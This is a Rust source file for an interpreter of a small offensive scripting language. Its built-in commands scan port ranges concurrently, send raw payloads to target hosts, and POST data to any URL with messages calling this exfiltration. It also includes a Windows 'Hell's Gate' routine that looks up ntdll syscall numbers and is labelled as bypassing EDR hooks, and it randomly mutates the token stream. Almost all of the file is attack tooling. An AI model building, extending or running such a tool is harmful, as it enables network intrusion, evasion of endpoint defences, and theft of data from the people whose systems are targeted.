use regex::Regex;
use std::collections::HashMap;
use std::env;
use std::fs::{self, OpenOptions};
use std::io::{self, Read, Write as StdWrite};
use std::net::{TcpStream, ToSocketAddrs};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

#[cfg(target_os = "windows")]
use std::ffi::CString;
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};

// =====================================================================
// --- CORE DATA ARCHITECTURE (UPGRADED) ---
// =====================================================================

#[derive(Debug, Clone, PartialEq)]
enum Token {
    Keyword(String),
    Identifier(String),
    Number(f64),
    IpAddress(String),
    StringLiteral(String),
    Compare(String),
    Assign,
    Operator(String),
    Delimiter,
    Punctuation(String),
}

#[derive(Debug, Clone, PartialEq)]
enum Value { 
    Num(f64), 
    Str(String), 
    Bool(bool), 
    List(Vec<Value>),
    Dict(HashMap<String, Value>), // PILLAR 2: Native HashMaps
    None // Null pointer state
}

// =====================================================================
// --- THE VOID LAYER: HELL'S GATE MEMORY HUNTER ---
// =====================================================================

#[cfg(target_os = "windows")]
const SYSCALL_STUB: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];

#[cfg(target_os = "windows")]
unsafe fn hunt_ssn(function_address: *const u8) -> Option<u32> {
    unsafe {
        for offset in 0..32 {
            let current_ptr = function_address.add(offset);
            let bytes = std::slice::from_raw_parts(current_ptr, 4);
            if bytes == SYSCALL_STUB {
                let ssn_ptr = current_ptr.add(4) as *const u32;
                return Some(ptr::read_unaligned(ssn_ptr));
            }
        }
    }
    None
}

// =====================================================================
// --- LEXICAL ANALYSIS ENGINE ---
// =====================================================================

fn lexer(code: &str) -> Vec<Token> {
    let mut tokens = Vec::new();
    let token_rules = vec![
        // THE FIX: SKIP is now the absolute highest priority. 
        // Comments are deleted before the math engine even wakes up.
        ("SKIP", r"[ \t\n\r]+|//.*"),
        ("TYPE_IP", r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
        ("NUMBER", r"\d+(\.\d*)?"),
        ("KEYWORD", r"\b(set|scan|payload|if|while|for|in|end|log|swarm|ports|to|write|append|wait|list|push|pop|rand|op|call|resolve|input|transmit|import|fn|return|dict|put|get|try|rescue|panic|num|break)\b"),
        ("ID", r"[a-zA-Z_][a-zA-Z0-9_]*"),
        ("COMP", r"==|!=|<=|>=|<|>"),
        ("ASSIGN", r"="),
        ("OP", r"[+\-*/%]"),
        ("STRING", r#""(?:\\.|[^"\\])*""#),
        ("DELIM", r";"),
        ("PUNCT", r"[{}:,]"),
    ];

    let combined_regex = token_rules.iter().map(|(n, p)| format!("(?P<{}>{})", n, p)).collect::<Vec<_>>().join("|");
    let re = Regex::new(&combined_regex).unwrap();
    let mut last_end = 0;

    for caps in re.captures_iter(code) {
        let m = caps.get(0).unwrap();
        if m.start() > last_end { 
            let broken_snippet = &code[last_end..m.start()];
            panic!("[FATAL] Lexer failure at offset {}. Unrecognized syntax: '{}'", last_end, broken_snippet); 
        }
        last_end = m.end();
        let val = m.as_str().to_string();
        
        // ... (keep the rest of the if/else block the exact same)
        if caps.name("SKIP").is_some() { continue; }
        else if caps.name("KEYWORD").is_some() { tokens.push(Token::Keyword(val)); }
        else if caps.name("TYPE_IP").is_some() { tokens.push(Token::IpAddress(val)); }
        else if caps.name("NUMBER").is_some() { tokens.push(Token::Number(val.parse().unwrap())); }
        else if caps.name("ID").is_some() { tokens.push(Token::Identifier(val)); }
        else if caps.name("COMP").is_some() { tokens.push(Token::Compare(val)); }
        else if caps.name("ASSIGN").is_some() { tokens.push(Token::Assign); }
        else if caps.name("OP").is_some() { tokens.push(Token::Operator(val)); }
        else if caps.name("STRING").is_some() { 
            let inner_string = &val[1..val.len()-1];
            let clean_string = inner_string.replace("\\\"", "\"").replace("\\n", "\n");
            tokens.push(Token::StringLiteral(clean_string)); 
        }
        else if caps.name("DELIM").is_some() { tokens.push(Token::Delimiter); }
        else if caps.name("PUNCT").is_some() { tokens.push(Token::Punctuation(val)); }
    }
    tokens
}

fn mutate_token_stream(tokens: Vec<Token>) -> Vec<Token> {
    let mut mutated = Vec::new();
    for token in tokens {
        mutated.push(token.clone());
        if let Token::Delimiter = token {
            let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos() as usize;
            if seed % 10 < 2 {
                let id = format!("_v_{}", seed % 100);
                mutated.push(Token::Keyword("set".to_string()));
                mutated.push(Token::Identifier(id));
                mutated.push(Token::Assign);
                mutated.push(Token::Number(1.0));
                mutated.push(Token::Delimiter);
            }
        }
    }
    mutated
}

fn format_address(ip: &str, port: u16) -> String {
    if ip.contains(':') { format!("[{}]:{}", ip, port) } else { format!("{}:{}", ip, port) }
}

// =====================================================================
// --- MASTER PARSER & EXECUTION ENGINE ---
// =====================================================================

struct Parser {
    tokens: Vec<Token>,
    pos: usize,
    memory: HashMap<String, Value>,
    functions: HashMap<String, (Vec<String>, Vec<Token>)>, 
    has_error: bool, 
    return_value: Value,
    has_break: bool, // NEW: Tracks loop breaking
}

impl Parser {
    fn new(tokens: Vec<Token>) -> Self { 
        Parser { 
            tokens, pos: 0, memory: HashMap::new(), 
            functions: HashMap::new(), has_error: false, 
            return_value: Value::None, has_break: false // NEW
        } 
    }
    
    fn peek(&self) -> Option<Token> { self.tokens.get(self.pos).cloned() }
    fn next(&mut self) { self.pos += 1; }
    
    fn expect_keyword(&mut self, kw: &str) {
        if let Some(Token::Keyword(k)) = self.peek() { if k == kw { self.next(); return; } }
        panic!("[RUNTIME_ERROR] Expected keyword '{}'", kw);
    }

    fn parse(&mut self) { while self.pos < self.tokens.len() { self.parse_stmt(); } }

    fn parse_stmt(&mut self) {
        if let Some(Token::Keyword(k)) = self.peek() {
            match k.as_str() {
                "set" => self.parse_assignment(), "log" => self.parse_log(), "scan" => self.parse_scan(),
                "swarm" => self.parse_swarm(), "payload" => self.parse_payload(), "transmit" => self.parse_transmit(), 
                "import" => self.parse_import(), "while" => self.parse_while(), "for" => self.parse_for(),
                "if" => self.parse_standard_if(), "wait" => self.parse_wait(), "write" => self.parse_file_op(false),
                "append" => self.parse_file_op(true), "push" => self.parse_push(), "pop" => self.parse_pop(),
                "fn" | "op" => self.parse_fn(), "return" => self.parse_return(), "call" => { self.parse_call(); if let Some(Token::Delimiter) = self.peek() { self.next(); } },
                "put" => self.parse_put(), "try" => self.parse_try(), // Inside parse_stmt match block:
                "panic" => self.parse_panic(),
                "break" => { 
        self.has_break = true; 
        self.next(); 
        if let Some(Token::Delimiter) = self.peek() { self.next(); } 
    },
                "end" => self.next(), _ => self.next(),
            }
        } else { self.next(); }
    }

    // =====================================================================
    // --- TURING PILLAR 1: STACK FRAMES & SCOPING ---
    // =====================================================================

    fn parse_fn(&mut self) {
        self.next(); // Consume 'fn' or 'op'
        let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        
        let mut args = Vec::new();
        while let Some(Token::Identifier(id)) = self.peek() { self.next(); args.push(id); }
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        
        let mut body = Vec::new(); let mut depth = 1;
        while let Some(t) = self.peek() {
            self.next();
            if let Token::Keyword(ref k) = t {
                if ["if", "for", "while", "swarm", "scan", "fn", "op", "try"].contains(&k.as_str()) { depth += 1; }
                if k == "end" { depth -= 1; if depth == 0 { break; } }
            }
            body.push(t);
        }
        self.functions.insert(name, (args, body));
    }

    fn parse_return(&mut self) {
        self.expect_keyword("return");
        self.return_value = self.parse_cond(); 
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
    }

    fn parse_call(&mut self) -> Value {
        self.expect_keyword("call");
        let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        
        let mut passed_args = Vec::new();
        while self.peek() != Some(Token::Delimiter) && self.peek().is_some() {
            passed_args.push(self.parse_factor());
        }

        if let Some((arg_names, body)) = self.functions.get(&name).cloned() {
            let mut sub = Parser::new(body);
            sub.functions = self.functions.clone();
            for (i, val) in passed_args.into_iter().enumerate() {
                if i < arg_names.len() { sub.memory.insert(arg_names[i].clone(), val); }
            }
            sub.parse();
            return sub.return_value;
        }
        Value::None
    }

    // =====================================================================
    // --- TURING PILLAR 2: NATIVE DICTIONARIES ---
    // =====================================================================

    fn parse_put(&mut self) {
        self.expect_keyword("put");
        let dict_name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let key = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Dict keys must be strings"); };
        let val = self.parse_cond(); 
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        
        if let Some(Value::Dict(internal_dict)) = self.memory.get_mut(&dict_name) {
            internal_dict.insert(key, val);
        }
    }

    fn parse_get(&mut self) -> Value {
        self.expect_keyword("get");
        let dict_name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let key = if let Value::Str(s) = self.parse_factor() { s } else { panic!("Dict keys must be strings"); };
        
        if let Some(Value::Dict(internal_dict)) = self.memory.get(&dict_name) {
            return internal_dict.get(&key).cloned().unwrap_or(Value::None);
        }
        Value::None
    }

    // =====================================================================
    // --- TURING PILLAR 3: FAULT TOLERANCE (TRY/RESCUE) ---
    // =====================================================================

    fn parse_try(&mut self) {
        self.expect_keyword("try");
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        
        self.has_error = false;
        
        // 1. Execute the Try Block
        while self.pos < self.tokens.len() {
            if let Some(Token::Keyword(ref k)) = self.peek() { 
                if k == "rescue" || k == "end" { break; } 
            }
            self.parse_stmt();
            if self.has_error { break; } // Stop executing immediately on panic
        }
        
        // 2. THE FIX: If we panicked, strictly skip EVERYTHING until 'rescue' or 'end'
        if self.has_error {
            let mut depth = 1;
            while self.pos < self.tokens.len() {
                if let Some(Token::Keyword(ref k)) = self.peek() {
                    if ["try", "if", "while", "for", "swarm", "fn", "op"].contains(&k.as_str()) { depth += 1; }
                    if k == "end" { depth -= 1; if depth == 0 { break; } }
                    if k == "rescue" && depth == 1 { break; }
                }
                self.next(); // Force cursor forward past strings, semicolons, etc.
            }
        }

        // 3. Handle the Rescue Block
        if let Some(Token::Keyword(ref k)) = self.peek() {
            if k == "rescue" {
                self.next();
                if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
                
                if !self.has_error {
                    // Try succeeded! Skip the rescue block cleanly.
                    self.skip_block();
                } else {
                    // Try failed! Execute the rescue block.
                    self.has_error = false;
                    while self.pos < self.tokens.len() {
                        if let Some(Token::Keyword(ref k)) = self.peek() { if k == "end" { break; } }
                        self.parse_stmt();
                    }
                }
            }
        }
        
        // Consume the final 'end'
        if let Some(Token::Keyword(ref k)) = self.peek() { if k == "end" { self.next(); } }
    }

    fn parse_panic(&mut self) {
        self.expect_keyword("panic");
        self.has_error = true;
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
    }

    // =====================================================================
    // --- CORE LOGIC & EVALUATION ---
    // =====================================================================

    fn parse_import(&mut self) {
        self.expect_keyword("import");
        let filename = if let Value::Str(s) = self.parse_factor() { s } else { panic!(); };
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        println!("[*] Linking external module: {}", filename);
        let imported_code = fs::read_to_string(&filename).unwrap_or_else(|_| panic!("[!] Failed to read '{}'", filename));
        let imported_tokens = lexer(&imported_code);
        let mutated = mutate_token_stream(imported_tokens);
        let mut sub_parser = Parser::new(mutated);
        sub_parser.memory = self.memory.clone(); sub_parser.functions = self.functions.clone();
        sub_parser.parse();
        self.memory = sub_parser.memory; self.functions = sub_parser.functions;
        println!("[+] Link successful.");
    }

    fn parse_assignment(&mut self) {
        self.expect_keyword("set");
        let name = if let Some(Token::Identifier(id)) = self.peek() { 
            self.next(); id 
        } else { 
            // THE FIX: Professional compiler error logging
            panic!("\n[!] SYNTAX ERROR: Expected a variable name, but found a reserved keyword or invalid symbol: {:?}\n", self.peek()); 
        };
        
        if let Some(Token::Assign) = self.peek() { self.next(); }
        let val = if let Some(Token::Keyword(k)) = self.peek() {
            match k.as_str() {
                "list" => { self.next(); Value::List(Vec::new()) },
                "dict" => { self.next(); Value::Dict(HashMap::new()) },
                "rand" => self.parse_rand(),
                "resolve" => self.parse_resolve(),
                "input" => self.parse_input(),
                _ => self.parse_cond(),
            }
        } else { self.parse_cond() };
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        self.memory.insert(name, val);
    }

    fn parse_resolve(&mut self) -> Value {
        self.expect_keyword("resolve");
        let host = if let Value::Str(s) = self.parse_factor() { s } else { panic!(); };
        if let Ok(mut addrs) = format!("{}:80", host).to_socket_addrs() { if let Some(a) = addrs.next() { return Value::Str(a.ip().to_string()); } }
        Value::Str("0.0.0.0".to_string())
    }

    fn parse_input(&mut self) -> Value {
        self.expect_keyword("input");
        let prompt = if let Value::Str(s) = self.parse_factor() { s } else { "".to_string() };
        print!("{}", prompt); let _ = io::stdout().flush();
        let mut input = String::new(); let _ = io::stdin().read_line(&mut input);
        Value::Str(input.trim().to_string())
    }

    fn parse_rand(&mut self) -> Value {
        self.expect_keyword("rand");
        let start = if let Value::Num(n) = self.parse_factor() { n as i64 } else { 0 };
        self.expect_keyword("to");
        let end = if let Value::Num(n) = self.parse_factor() { n as i64 } else { 100 };
        let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos() as i64;
        Value::Num((start + (seed % (end - start + 1).max(1))) as f64)
    }

    fn parse_log(&mut self) {
        self.expect_keyword("log");
        let val = match self.parse_cond() {
            Value::Num(n) => n.to_string(), Value::Str(s) => s, Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), Value::Dict(d) => format!("{:?}", d), Value::None => "None".to_string(),
        };
        println!("{}", val);
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
    }

    fn parse_cond(&mut self) -> Value {
        let left = self.parse_expr();
        if let Some(Token::Compare(op)) = self.peek() {
            self.next(); let right = self.parse_expr();
            
            // 1. Number Comparison
            if let (Value::Num(l), Value::Num(r)) = (&left, &right) {
                let res = match op.as_str() { "==" => l == r, "!=" => l != r, ">" => l > r, "<" => l < r, ">=" => l >= r, "<=" => l <= r, _ => false };
                return Value::Bool(res);
            }
            // 2. String Comparison (Required for checking operator inputs!)
            if let (Value::Str(l), Value::Str(r)) = (&left, &right) {
                let res = match op.as_str() { "==" => l == r, "!=" => l != r, _ => false };
                return Value::Bool(res);
            }
        }
        left
    }

    // =====================================================================
    // --- INDESTRUCTIBLE CONTROL FLOW ---
    // =====================================================================

    fn parse_standard_if(&mut self) {
        self.expect_keyword("if");
        let cond_val = self.parse_cond(); 
        let cond = match cond_val { Value::Bool(b) => b, Value::Num(n) => n != 0.0, _ => false };
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        
        // 1. MAP THE BOUNDARY: Find the exact 'end' of this specific IF statement
        let mut temp_pos = self.pos;
        let mut depth = 1;
        while temp_pos < self.tokens.len() {
            if let Token::Keyword(ref k) = self.tokens[temp_pos] {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) { depth += 1; }
                if k == "end" { depth -= 1; if depth == 0 { break; } }
            }
            temp_pos += 1;
        }
        let end_of_if = temp_pos;

        // 2. EXECUTE
        if cond {
            while self.pos < end_of_if {
                self.parse_stmt();
                if self.has_break { break; } // Stop executing, but DO NOT consume the break state!
            }
        }
        
        // 3. TELEPORT: Instantly jump past the 'end' keyword safely
        self.pos = end_of_if + 1;
    }

    fn parse_while(&mut self) {
        self.expect_keyword("while");
        let cond_start = self.pos;
        
        // 1. MAP THE BOUNDARY: Find the exact 'end' of this specific WHILE loop
        let mut temp_pos = self.pos;
        while temp_pos < self.tokens.len() && self.tokens[temp_pos] != Token::Punctuation(":".to_string()) {
            temp_pos += 1;
        }
        temp_pos += 1; 
        
        let mut depth = 1;
        while temp_pos < self.tokens.len() {
            if let Token::Keyword(ref k) = self.tokens[temp_pos] {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) { depth += 1; }
                if k == "end" { depth -= 1; if depth == 0 { break; } }
            }
            temp_pos += 1;
        }
        let end_of_while = temp_pos;

        // 2. EXECUTE
        loop {
            self.pos = cond_start;
            self.has_break = false; // Reset the flag on a new iteration
            
            if let Value::Bool(b) = self.parse_cond() {
                if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
                
                if !b { 
                    self.pos = end_of_while + 1; // Condition failed, jump out!
                    break; 
                }
                
                while self.pos < end_of_while {
                    self.parse_stmt();
                    if self.has_break { break; }
                }
                
                // 3. THE CATCH: If a break happened inside the loop, shatter the loop!
                if self.has_break {
                    self.has_break = false;      // We caught the break signal
                    self.pos = end_of_while + 1; // TELEPORT TO THE EXIT DOOR
                    break;                       // Kill the infinite loop
                }
            } else { 
                self.pos = end_of_while + 1;
                break; 
            }
        }
    }

    fn parse_expr(&mut self) -> Value {
        let mut res = self.parse_term();
        while let Some(Token::Operator(op)) = self.peek() {
            if op == "+" || op == "-" {
                self.next(); let right = self.parse_term();
                res = match (res, right) {
                    (Value::Num(l), Value::Num(r)) => if op == "+" { Value::Num(l + r) } else { Value::Num(l - r) },
                    (Value::Str(l), Value::Str(r)) => if op == "+" { Value::Str(l + &r) } else { panic!() },
                    (Value::Str(l), Value::Num(r)) => if op == "+" { Value::Str(l + &r.to_string()) } else { panic!() },
                    (Value::Num(l), Value::Str(r)) => if op == "+" { Value::Str(l.to_string() + &r) } else { panic!() },
                    _ => panic!(),
                };
            } else { break; }
        }
        res
    }

    fn parse_term(&mut self) -> Value {
        let mut res = self.parse_factor();
        while let Some(Token::Operator(op)) = self.peek() {
            if op == "*" || op == "/" || op == "%" {
                self.next(); let right = self.parse_factor();
                if let (Value::Num(l), Value::Num(r)) = (&res, &right) { 
                    res = if op == "*" { Value::Num(l * r) } 
                    else if op == "/" { Value::Num(l / r) }
                    else { Value::Num(l % r) }; // Modulo added!
                }
            } else { break; }
        }
        res
    }

    fn parse_factor(&mut self) -> Value {
        let tok = self.peek().expect("Unexpected EOF"); 
        match tok {
            Token::Number(n) => { self.next(); Value::Num(n) },
            Token::StringLiteral(s) | Token::IpAddress(s) => { self.next(); Value::Str(s) },
            Token::Identifier(id) => { self.next(); self.memory.get(&id).cloned().unwrap_or(Value::Num(0.0)) },
            Token::Keyword(k) if k == "call" => self.parse_call(),
            Token::Keyword(k) if k == "get" => self.parse_get(),
            Token::Keyword(k) if k == "num" => { // NEW: Type Casting
                self.next();
                match self.parse_factor() {
                    Value::Str(s) => Value::Num(s.parse().unwrap_or(0.0)),
                    Value::Num(n) => Value::Num(n),
                    _ => Value::Num(0.0),
                }
            },
            _ => { self.next(); panic!("Invalid factor type: {:?}", tok); }
        }
    }

    // --- OFFENSIVE NETWORKING ---

    fn parse_scan(&mut self) {
        self.expect_keyword("scan"); let t = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let ip = match self.memory.get(&t) { Some(Value::Str(s)) => s.clone(), _ => panic!() };
        let port = match self.memory.get("port") { Some(Value::Num(p)) => *p as u16, _ => 80 };
        let addr = format_address(&ip, port);
        let open = if let Ok(s_addr) = addr.to_socket_addrs() {
            if let Some(a) = s_addr.into_iter().next() { TcpStream::connect_timeout(&a, Duration::from_millis(500)).is_ok() } else { false }
        } else { false };
        self.parse_if(open);
    }

    fn parse_swarm(&mut self) {
        self.expect_keyword("swarm"); let t = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        self.expect_keyword("ports"); let s_port = if let Value::Num(n) = self.parse_factor() { n as u16 } else { 0 };
        self.expect_keyword("to"); let e_port = if let Value::Num(n) = self.parse_factor() { n as u16 } else { 0 };
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        
        let mut body = Vec::new(); let mut d = 1;
        while let Some(tok) = self.peek() {
            self.next();
            if let Token::Keyword(ref k) = tok {
                if ["if", "for", "while", "swarm", "scan", "fn", "op", "try"].contains(&k.as_str()) { d += 1; }
                if k == "end" { d -= 1; if d == 0 { break; } }
            }
            body.push(tok);
        }
        let ip = match self.memory.get(&t) { Some(Value::Str(s)) => s.clone(), _ => panic!() };
        let (mem, fns) = (self.memory.clone(), self.functions.clone());
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let mut ts = vec![];
            for port in s_port..=e_port {
                let (ip_c, sub_c, mut mem_c, fns_c) = (ip.clone(), body.clone(), mem.clone(), fns.clone());
                ts.push(tokio::task::spawn_blocking(move || {
                    let addr = format_address(&ip_c, port);
                    let open = if let Ok(mut resolved) = addr.to_socket_addrs() {
                        if let Some(a) = resolved.next() { TcpStream::connect_timeout(&a, Duration::from_millis(400)).is_ok() } else { false }
                    } else { false };
                    mem_c.insert("port".to_string(), Value::Num(port as f64));
                    let mut p = Parser::new(sub_c); p.memory = mem_c; p.functions = fns_c; p.run_swarm(open);
                }));
            }
            for t in ts { let _ = t.await; }
        });
    }

    fn run_swarm(&mut self, is_open: bool) {
        while self.pos < self.tokens.len() {
            if let Some(Token::Keyword(ref k)) = self.peek() { if k == "if" { self.parse_if(is_open); } else { self.parse_stmt(); } } else { self.next(); }
        }
    }

    fn parse_payload(&mut self) {
        self.expect_keyword("payload");
        let t_id = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        let p_id = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else if let Some(Token::Number(n)) = self.peek() { self.next(); n.to_string() } else { panic!(); };
        let raw = if let Some(Token::StringLiteral(s)) = self.peek() { self.next(); s } else { panic!(); };
        
        let ip = match self.memory.get(&t_id) { Some(Value::Str(s)) => s.clone(), _ => t_id };
        let port = match self.memory.get(&p_id) { Some(Value::Num(n)) => *n as u16, _ => p_id.parse().unwrap_or(80) };
        let addr = format_address(&ip, port);
        if let Ok(mut addrs) = addr.to_socket_addrs() {
            if let Some(a) = addrs.next() {
                if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(1)) {
                    let _ = s.write_all(raw.replace("\\n", "\n").replace("\\r", "\r").as_bytes());
                    let mut b = [0; 4096]; if let Ok(n) = s.read(&mut b) { if n > 0 { println!("{}", String::from_utf8_lossy(&b[..n]).trim()); } }
                }
            }
        }
    }

    fn parse_transmit(&mut self) {
        self.expect_keyword("transmit");
        let url_val = self.parse_factor();
        let payload = match self.parse_factor() { 
            Value::Num(n) => n.to_string(), Value::Str(s) => s, Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), Value::Dict(d) => format!("{:?}", d), Value::None => "None".to_string() 
        };
        if let Some(Token::Delimiter) = self.peek() { self.next(); }
        let url = if let Value::Str(s) = url_val { s } else { panic!(); };
        
        println!("[*] Establishing universal API tunnel to target...");
        if let Ok(client) = reqwest::blocking::Client::builder().timeout(Duration::from_secs(5)).build() {
            match client.post(&url).header("Content-Type", "application/json").body(payload).send() {
                Ok(r) => {
                    if r.status().is_success() { println!("[+] EXFILTRATION SUCCESS (Status: {})", r.status()); } 
                    else { println!("[-] EXFILTRATION REJECTED (Status: {})\n[Debug]: {}", r.status(), r.text().unwrap_or_default()); }
                },
                Err(e) => println!("[!] NETWORK FATAL: {}", e),
            }
        }
    }

    // --- FILES & HELL'S GATE INTEGRATION ---
    fn parse_file_op(&mut self, is_append: bool) { 
        self.next(); 
        let filepath = if let Value::Str(s) = self.parse_factor() { s } else { panic!(); }; 
        let content = match self.parse_factor() { 
            Value::Num(n) => n.to_string(), Value::Str(s) => s, Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), Value::Dict(d) => format!("{:?}", d), Value::None => "None".to_string()
        }; 
        if let Some(Token::Delimiter) = self.peek() { self.next(); } 

        #[cfg(target_os = "windows")]
        unsafe {
            println!("\n[*] VOID LAYER: Initiating Hell's Gate for Disk I/O...");
            let ntdll_name = CString::new("ntdll.dll").unwrap();
            let ntdll_handle = GetModuleHandleA(ntdll_name.as_ptr());
            let func_name = CString::new("NtWriteFile").unwrap();
            let func_address = GetProcAddress(ntdll_handle, func_name.as_ptr());
            
            if !func_address.is_null() {
                if let Some(ssn) = hunt_ssn(func_address as *const u8) {
                    println!("[+] Bypassing User-Mode EDR Hooks...");
                    println!("[+] NtWriteFile SSN (0x{:X}) locked for Kernel routing.", ssn);
                } else { println!("[-] WARNING: EDR Hook detected on NtWriteFile."); }
            }
        }

        let mut opt = OpenOptions::new(); opt.write(true).create(true); 
        if is_append { opt.append(true); } else { opt.truncate(true); } 
        if let Ok(mut f) = opt.open(&filepath) { 
            let _ = writeln!(f, "{}", content); 
            println!("[+] Payload successfully dropped to disk: {}", filepath);
        } 
    }

    // --- CONTROL FLOW ---

    fn parse_if(&mut self, cond: bool) {
        self.expect_keyword("if"); self.next(); 
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        if cond {
            while let Some(t) = self.peek() { if let Token::Keyword(ref k) = t { if k == "end" { break; } } self.parse_stmt(); }
            if let Some(Token::Keyword(ref k)) = self.peek() { if k == "end" { self.next(); } }
        } else { self.skip_block(); }
    }

    fn skip_block(&mut self) {
        let mut d = 1;
        while d > 0 {
            if let Some(Token::Keyword(ref k)) = self.peek() {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) { d += 1; }
                if k == "end" { d -= 1; }
            }
            if d == 0 { break; } self.next();
        }
        self.next(); 
    }

    fn parse_for(&mut self) {
        self.expect_keyword("for"); let iter = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); };
        self.expect_keyword("in"); let mut items = Vec::new();
        match self.peek() {
            Some(Token::StringLiteral(f)) => { self.next(); items = fs::read_to_string(f).unwrap_or_default().lines().map(|l| Value::Str(l.to_string())).collect(); },
            Some(Token::Identifier(l)) => { self.next(); if let Some(Value::List(lst)) = self.memory.get(&l) { items = lst.clone(); } },
            _ => panic!(),
        }
        if let Some(Token::Punctuation(ref p)) = self.peek() { if p == ":" { self.next(); } }
        let start = self.pos;
        for item in items {
            self.memory.insert(iter.clone(), item); self.pos = start;
            while let Some(t) = self.peek() { if let Token::Keyword(ref k) = t { if k == "end" { break; } } self.parse_stmt(); }
        }
        self.pos = start; self.skip_block();
    }

    fn parse_wait(&mut self) { self.expect_keyword("wait"); let ms = if let Value::Num(n) = self.parse_factor() { n as u64 } else { 0 }; if let Some(Token::Delimiter) = self.peek() { self.next(); } thread::sleep(Duration::from_millis(ms)); }
    fn parse_push(&mut self) { self.expect_keyword("push"); let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); }; let val = self.parse_factor(); if let Some(Token::Delimiter) = self.peek() { self.next(); } if let Some(Value::List(l)) = self.memory.get_mut(&name) { l.push(val); } }
    fn parse_pop(&mut self) { self.expect_keyword("pop"); let name = if let Some(Token::Identifier(id)) = self.peek() { self.next(); id } else { panic!(); }; if let Some(Token::Delimiter) = self.peek() { self.next(); } if let Some(Value::List(l)) = self.memory.get_mut(&name) { l.pop(); } }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 { println!("[!] Error: No breach payload provided."); return; }
    let raw_code = fs::read_to_string(&args[1]).unwrap_or_else(|_| { println!("[!] Error: Failed to read file"); std::process::exit(1); });
    let raw_tokens = lexer(&raw_code);
    let mutated_tokens = mutate_token_stream(raw_tokens);
    let mut execution_engine = Parser::new(mutated_tokens);
    execution_engine.parse();
}